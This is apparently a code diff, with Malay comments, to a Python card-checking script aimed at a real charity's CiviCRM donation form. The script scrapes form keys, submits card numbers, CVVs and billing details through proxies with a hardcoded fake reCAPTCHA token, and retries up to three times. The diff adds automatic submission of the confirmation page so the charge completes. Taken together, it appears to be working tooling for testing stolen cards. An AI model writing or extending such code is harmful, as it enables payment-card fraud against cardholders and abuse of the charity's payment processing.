@@ -117,7 +117,6 @@ def extract_raw_fields(html, soup, form):
     payload = {}
     inputs = form.find_all('input')
     
-    # Tangkap button submit sebenar dari HTML (JANGAN HARDCODE)
     submit_button_name = "_qf_Main_upload"
     submit_button_value = "1"
     for inp in inputs:
@@ -202,7 +201,6 @@ def get_form_action_and_payload(session, url, proxy_url):
         if form_action and not form_action.startswith('http'): form_action = urljoin(url, form_action)
         if not form_action: return None, None, None, None, "Form action not found"
         
-        # FIX: Bersihkan form_action dari &amp;
         form_action = form_action.replace("&amp;", "&")
         
         payload = extract_raw_fields(html, soup, form)
@@ -268,47 +266,88 @@ def process_site_for_payload(url, override_proxy=None):
     
     return {'url': url, 'status': 'success', 'payload': payload, 'form_action': form_action, 'qfkey': qfkey, 'has_authorize': has_authorize, 'session': session, 'proxy_url': proxy_url}
 
-def build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, amount):
+def extract_confirmation_form(html, soup):
+    confirm_form = soup.find('form', {'id': 'Confirm'})
+    if not confirm_form:
+        possible_forms = soup.find_all('form')
+        if possible_forms:
+            confirm_form = possible_forms[0]
+        else:
+            return None, None, None
+
+    new_qfkey_input = confirm_form.find('input', {'name': 'qfKey'})
+    new_qfkey = new_qfkey_input['value'] if new_qfkey_input and 'value' in new_qfkey_input.attrs else None
+    
+    action = confirm_form.get('action')
+    return confirm_form, action, new_qfkey
+
+def build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, amount, is_confirm=False, new_qfkey=None):
     scheme = get_card_type(ccnum)
     full_year = f"20{yy}" if len(yy) == 2 else yy
     input_month = int(mm)
 
     final_payload = {}
     
-    # TOKEN FAKE
-    final_payload["g-recaptcha-response"] = "0cAFcWeA4PqJOMFj5mWJD9PmhlqErXn7af22ptYqSm9PWIfUuWBD4CuqXOChTMG-uxogsiJFzY-zd9ZErdAp8mAMgGVa491KAT417HoBZftbG2aTzzIuzJAYLSzxNXPrDmt8nWhuGeMt66_-KgexQ5WcpNrAQXaUofULifI4N05Xu-aGCbF1BvuU6AQKLs8j_muWRkHZQVYplfzk5PPirHB8en_yuWaKIMceUyBJaF1KcvjAf6dHyu48kaDHdHhoor16NdbkzRS0G6EoFhQm1ktHTFEDkkiFkVS5LWx7BK_MeaaZUpIzjOIAMHL3rX_1M-PwJjAxT_LbQ9sYjVoI_m_8sAKjdRoiHAzgZdyBdytGY9OJEVAUukVHGRU6tO15M9lYYhA5VzK4nD0dWeCfIk15U3TcAwZgdAcV036TnwfZMFfC636oW7SgQ0Q76xPLGYNxYI0JT3TR8nHnW-sqmXk8pZQ-3wR3Zy056eCjt-qyR9a-1hRmvcO-O9OvBPQpoEnT_0kNxXtEjAtbCvYz2iitwZoMX4iA7krPUGYUhku9VEQdyNkR_IW5S-DUypInmpqVy1DR0g7iGE4GccDpimMUHlr9VThWRDLS_mpBvRAVuOsjH7RaahI2xoXWZyIHQ0he2nsI-q-0hdJ_O5UVr1rPzWCYvEGu9ufhE6AhIMz1XKnO5mxHppZ6oCMzAW7jwPgwf4VBSJjWB4ym_YriAPEmq4su1ehRc21xtl03WlPLZyAqIwmSzNc5O6biV-bMVa7BQuBGZOILy4X3qQ-0O0byiscz729xXIN30L4hR5rv7zMP-WctzXSvLxkk9dWS2mpaD3msoBXZP4Ac6SkGf_TvG3YlOOEjfgTNnTT86tVhC11Ni9PXwl9m2kolOe7v_PmMhmgN-jE3IjxFWHxpCfN9_MfQk-jYJQ2s05tgXlPz4kh_4R6AWuuIozqsdIPI676qsiqkKFiQptp_NxaARq3KndEd4eS5Vh8GYEmgBBaE6o_KrWQRTG-E5WuA1X0CcpPLBk6RvroZdQGy9kwInxFEF9u9h4J3ja7tWqOqrnomaGzjC7AM3KoJvE3wXpU6EW_JLHUbXNSDfkjdDWMzM9bfiZ5NsWYnDQtXzHBYYtv6KVD-ziCCwAkG84RUBjLscQkJCe7Wn-Dujhe9W34cw6Sw8eeFroIEPAs_hsnJQabopNAWRNKnK49wYsVkrmV31D3OxGFNuQfFPR-PLzeIYb4yhAuwVehhGeOAFsp0RSVQssODPW6ncHgBXuL5hakVTl9ehyjIcaB6E5QzLrPFjIjGAMRUmaEzWzpO4R5Oq2S0CZZA-QxNInQjvH54iwT5BKbjdZYXY6xA2"
+    # TOKEN FAKE HANYA UNTUK INITIAL PAGE
+    if not is_confirm:
+        final_payload["g-recaptcha-response"] = "0cAFcWeA4PqJOMFj5mWJD9PmhlqErXn7af22ptYqSm9PWIfUuWBD4CuqXOChTMG-uxogsiJFzY-zd9ZErdAp8mAMgGVa491KAT417HoBZftbG2aTzzIuzJAYLSzxNXPrDmt8nWhuGeMt66_-KgexQ5WcpNrAQXaUofULifI4N05Xu-aGCbF1BvuU6AQKLs8j_muWRkHZQVYplfzk5PPirHB8en_yuWaKIMceUyBJaF1KcvjAf6dHyu48kaDHdHhoor16NdbkzRS0G6EoFhQm1ktHTFEDkkiFkVS5LWx7BK_MeaaZUpIzjOIAMHL3rX_1M-PwJjAxT_LbQ9sYjVoI_m_8sAKjdRoiHAzgZdyBdytGY9OJEVAUukVHGRU6tO15M9lYYhA5VzK4nD0dWeCfIk15U3TcAwZgdAcV036TnwfZMFfC636oW7SgQ0Q76xPLGYNxYI0JT3TR8nHnW-sqmXk8pZQ-3wR3Zy056eCjt-qyR9a-1hRmvcO-O9OvBPQpoEnT_0kNxXtEjAtbCvYz2iitwZoMX4iA7krPUGYUhku9VEQdyNkR_IW5S-DUypInmpqVy1DR0g7iGE4GccDpimMUHlr9VThWRDLS_mpBvRAVuOsjH7RaahI2xoXWZyIHQ0he2nsI-q-0hdJ_O5UVr1rPzWCYvEGu9ufhE6AhIMz1XKnO5mxHppZ6oCMzAW7jwPgwf4VBSJjWB4ym_YriAPEmq4su1ehRc21xtl03WlPLZyAqIwmSzNc5O6biV-bMVa7BQuBGZOILy4X3qQ-0O0byiscz729xXIN30L4hR5rv7zMP-WctzXSvLxkk9dWS2mpaD3msoBXZP4Ac6SkGf_TvG3YlOOEjfgTNnTT86tVhC11Ni9PXwl9m2kolOe7v_PmMhmgN-jE3IjxFWHxpCfN9_MfQk-jYJQ2s05tgXlPz4kh_4R6AWuuIozqsdIPI676qsiqkKFiQptp_NxaARq3KndEd4eS5Vh8GYEmgBBaE6o_KrWQRTG-E5WuA1X0CcpPLBk6RvroZdQGy9kwInxFEF9u9h4J3ja7tWqOqrnomaGzjC7AM3KoJvE3wXpU6EW_JLHUbXNSDfkjdDWMzM9bfiZ5NsWYnDQtXzHBYYtv6KVD-ziCCwAkG84RUBjLscQkJCe7Wn-Dujhe9W34cw6Sw8eeFroIEPAs_hsnJQabopNAWRNKnK49wYsVkrmV31D3OxGFNuQfFPR-PLzeIYb4yhAuwVehhGeOAFsp0RSVQssODPW6ncHgBXuL5hakVTl9ehyjIcaB6E5QzLrPFjIjGAMRUmaEzWzpO4R5Oq2S0CZZA-QxNInQjvH54iwT5BKbjdZYXY6xA2"
 
-    final_payload["qfKey"] = qfkey
-    final_payload["entryURL"] = "https://www.saharaaa.org/civicrm/contribute/transact/?reset=1&id=1"
-    final_payload["hidden_processor"] = "1"
-    final_payload["payment_processor_id"] = "4"
-    final_payload["priceSetId"] = "3"
-    final_payload["selectProduct"] = ""
-    final_payload["_qf_default"] = "Main:upload"
-    final_payload["MAX_FILE_SIZE"] = "536870912"
-    final_payload["price_2"] = amount
-    final_payload["email-5"] = user_data['email']
-    final_payload["custom_1"] = full_year
-    final_payload["custom_2"] = "6PM Wednesday"
-    final_payload["custom_3"] = ""
-    final_payload["credit_card_type"] = scheme
-    final_payload["credit_card_number"] = ccnum
-    final_payload["cvv2"] = cvv
-    final_payload["credit_card_exp_date[M]"] = str(input_month)
-    final_payload["credit_card_exp_date[Y]"] = full_year
-    final_payload["billing_first_name"] = user_data['first_name']
-    final_payload["billing_middle_name"] = user_data['middle_name']
-    final_payload["billing_last_name"] = user_data['last_name']
-    final_payload["billing_street_address-5"] = user_data['street_address']
-    final_payload["billing_city-5"] = user_data['city']
-    final_payload["billing_country_id-5"] = "1228"
-    final_payload["billing_state_province_id-5"] = user_data['state_id']
-    final_payload["billing_postal_code-5"] = user_data['postal_code']
-    
-    # GUNA NAMA BUTANG YANG DITANGKAP DARI HTML
-    submit_name = raw_payload.get('_submit_button_name', '_qf_Main_upload')
-    submit_val = raw_payload.get('_submit_button_value', '1')
-    final_payload[submit_name] = submit_val
+    if is_confirm:
+        final_payload["qfKey"] = new_qfkey if new_qfkey else qfkey
+        final_payload["entryURL"] = ""
+        final_payload["_qf_default"] = "Confirm:next"
+        final_payload["_qf_Confirm_next"] = "Confirm"
+        final_payload["email-5"] = user_data['email']
+        final_payload["custom_1"] = full_year
+        final_payload["custom_2"] = ""
+        final_payload["custom_3"] = ""
+        final_payload["priceSetId"] = "3"
+        final_payload["price_2"] = amount
+        final_payload["payment_processor_id"] = "4"
+        final_payload["credit_card_type"] = scheme
+        final_payload["credit_card_number"] = ccnum
+        final_payload["cvv2"] = cvv
+        final_payload["credit_card_exp_date[M]"] = str(input_month)
+        final_payload["credit_card_exp_date[Y]"] = full_year
+        final_payload["billing_first_name"] = user_data['first_name']
+        final_payload["billing_middle_name"] = user_data['middle_name']
+        final_payload["billing_last_name"] = user_data['last_name']
+        final_payload["billing_street_address-5"] = user_data['street_address']
+        final_payload["billing_city-5"] = user_data['city']
+        final_payload["billing_country_id-5"] = "1228"
+        final_payload["billing_state_province_id-5"] = user_data['state_id']
+        final_payload["billing_postal_code-5"] = user_data['postal_code']
+    else:
+        final_payload["qfKey"] = qfkey
+        final_payload["entryURL"] = "https://www.saharaaa.org/civicrm/contribute/transact/?reset=1&id=1"
+        final_payload["hidden_processor"] = "1"
+        final_payload["payment_processor_id"] = "4"
+        final_payload["priceSetId"] = "3"
+        final_payload["selectProduct"] = ""
+        final_payload["_qf_default"] = "Main:upload"
+        final_payload["MAX_FILE_SIZE"] = "536870912"
+        final_payload["price_2"] = amount
+        final_payload["email-5"] = user_data['email']
+        final_payload["custom_1"] = full_year
+        final_payload["custom_2"] = "6PM Wednesday"
+        final_payload["custom_3"] = ""
+        final_payload["credit_card_type"] = scheme
+        final_payload["credit_card_number"] = ccnum
+        final_payload["cvv2"] = cvv
+        final_payload["credit_card_exp_date[M]"] = str(input_month)
+        final_payload["credit_card_exp_date[Y]"] = full_year
+        final_payload["billing_first_name"] = user_data['first_name']
+        final_payload["billing_middle_name"] = user_data['middle_name']
+        final_payload["billing_last_name"] = user_data['last_name']
+        final_payload["billing_street_address-5"] = user_data['street_address']
+        final_payload["billing_city-5"] = user_data['city']
+        final_payload["billing_country_id-5"] = "1228"
+        final_payload["billing_state_province_id-5"] = user_data['state_id']
+        final_payload["billing_postal_code-5"] = user_data['postal_code']
+        
+        submit_name = raw_payload.get('_submit_button_name', '_qf_Main_upload')
+        submit_val = raw_payload.get('_submit_button_value', '1')
+        final_payload[submit_name] = submit_val
 
     return final_payload
 
@@ -323,9 +362,8 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
 
     for attempt in range(3):
         try:
-            clean_initial = build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, detected_price)
+            clean_initial = build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, detected_price, is_confirm=False)
 
-            # FIX: LOCK HEADER STATIK
             session.headers.update({
                 "Referer": "https://www.saharaaa.org/civicrm/contribute/transact/?reset=1&id=1",
                 "Origin": "https://www.saharaaa.org",
@@ -336,7 +374,6 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
                 "Upgrade-Insecure-Requests": "1"
             })
 
-            # Paksa pastikan qfKey ada dalam URL POST
             post_url = form_action
             if 'qfKey=' not in post_url:
                 if '?' in post_url: post_url += f'&qfKey={qfkey}'
@@ -348,10 +385,31 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
             
             logging.info(f"URL Selepas Submit Pertama: {response.url}")
             
-            result = parse_response(response.text, response.url)
+            # AKTIFKAN CONFIRMATION PAGE
+            confirm_btn = soup_resp.find('input', {'name': '_qf_Confirm_next'}) or soup_resp.find('button', {'name': '_qf_Confirm_next'})
+            is_confirmation = '_qf_Confirm_display=true' in response.url or '_qf_Confirm_display=1' in response.url
             
-            if result.get('is_confirmation'):
-                logging.info("Berjaya masuk Confirmation Page, tapi skip buat apa2 sebab nak fokus Initial Page")
+            if confirm_btn or is_confirmation:
+                confirm_form, confirm_action, new_qfkey = extract_confirmation_form(response.text, soup_resp)
+                
+                qfkey_to_use = new_qfkey if new_qfkey else qfkey
+
+                confirm_post_url = form_action
+                if confirm_action:
+                    confirm_post_url = urljoin("https://www.saharaaa.org/civicrm/contribute/transact/", confirm_action)
+
+                session.headers.update({
+                    "Referer": response.url
+                })
+
+                clean_confirm = build_clean_payload({}, user_data, ccnum, mm, yy, cvv, qfkey, detected_price, is_confirm=True, new_qfkey=qfkey_to_use)
+                confirm_response = session.post(confirm_post_url, data=clean_confirm, timeout=TIMEOUT_SECONDS + 2, allow_redirects=True)
+                
+                logging.info(f"URL Selepas Submit Kedua: {confirm_response.url}")
+                
+                result = parse_response(confirm_response.text, confirm_response.url)
+            else:
+                result = parse_response(response.text, response.url)
             
             if 'session has expired' in result.get('message', '').lower() or 'unable to complete' in result.get('message', '').lower():
                 if attempt < 2:
